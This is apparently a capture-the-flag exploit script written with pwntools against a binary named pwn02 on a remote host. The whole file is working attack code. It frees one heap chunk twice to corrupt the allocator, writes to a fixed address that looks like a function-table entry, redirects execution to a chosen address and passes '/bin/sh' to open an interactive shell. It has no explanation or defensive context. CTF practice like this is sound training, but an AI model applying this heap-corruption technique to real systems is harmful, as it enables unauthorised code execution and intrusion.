from pwn import *

#p = process('./pwn02')
p = remote('39.100.87.24',8102)
elf = ELF('./pwn02')
context.log_level = 'debug'

def add(index,size,content):
    p.sendlineafter('> ','1 '+str(index))
    p.sendline(str(size))
    p.sendline(content)

def delete(index):
    p.sendlineafter('> ','2 '+str(index))

def show(index):
    p.sendlineafter('> ','3 '+str(index))

add(0,0x30,'A'*0x30)
add(1,0x30,'A'*0x30)
add(2,0x20,'A'*0x20)
delete(0)
delete(1)
delete(0)

add(0,0x30,p64(0x600e02))
add(0,0x30,'A')
add(0,0x30,'A')
add(0,0x30,'A'*6+p64(0x400856)+'/bin/sh')

p.sendlineafter('> ','1 0')
#gdb.attach(p)
p.sendline(str(0x600e20))

p.interactive()
